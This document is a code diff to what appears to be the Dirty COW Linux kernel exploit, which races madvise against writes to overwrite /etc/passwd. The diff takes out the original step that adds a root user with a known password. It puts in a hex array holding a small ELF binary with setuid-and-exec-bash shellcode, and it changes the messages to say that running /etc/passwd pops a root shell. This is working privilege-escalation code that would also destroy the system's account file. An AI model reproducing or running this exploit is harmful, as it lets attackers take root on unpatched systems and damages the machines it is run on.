@@ -44,37 +44,12 @@
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
 
 int f;
 void *map;
 pid_t pid;
 pthread_t pth;
 struct stat st;
-
-struct Userinfo {
-   char *username;
-   char *hash;
-   int user_id;
-   int group_id;
-   char *info;
-   char *home_dir;
-   char *shell;
-};
-
-char *generate_password_hash(char *plaintext_pw) {
-  return crypt(plaintext_pw, salt);
-}
-
-char *generate_passwd_line(struct Userinfo u) {
-  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
-  int size = snprintf(NULL, 0, format, u.username, u.hash,
-    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-  char *ret = malloc(size + 1);
-  sprintf(ret, format, u.username, u.hash, u.user_id,
-    u.group_id, u.info, u.home_dir, u.shell);
-  return ret;
-}
 
 void *madviseThread(void *arg) {
   int i, c = 0;
@@ -125,28 +100,22 @@ int main(int argc, char *argv[])
   if (ret != 0) {
     exit(ret);
   }
-
-  struct Userinfo user;
-  // set values, change as needed
-  user.username = "firefart";
-  user.user_id = 0;
-  user.group_id = 0;
-  user.info = "pwned";
-  user.home_dir = "/root";
-  user.shell = "/bin/bash";
-
-  char *plaintext_pw;
-
-  if (argc >= 2) {
-    plaintext_pw = argv[1];
-    printf("Please enter the new password: %s\n", plaintext_pw);
-  } else {
-    plaintext_pw = getpass("Please enter the new password: ");
-  }
-
-  user.hash = generate_password_hash(plaintext_pw);
-  char *complete_passwd_line = generate_passwd_line(user);
-  printf("Complete line:\n%s\n", complete_passwd_line);
+   
+ char complete_passwd_line[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+  printf("Complete shell code:\n%s\n", complete_passwd_line);
 
   f = open(filename, O_RDONLY);
   fstat(f, &st);
@@ -184,9 +153,8 @@ int main(int argc, char *argv[])
     pthread_join(pth,NULL);
   }
 
-  printf("Done! Check %s to see if the new user was created.\n", filename);
-  printf("You can log in with the username '%s' and the password '%s'.\n\n",
-    user.username, plaintext_pw);
+  printf("Done! Check %s to see if the shell code has got injected.\n", filename);
+  printf("You can run '%s' to pop a root shell.\n\n", filename);
     printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
     backup_filename, filename);
   return 0;
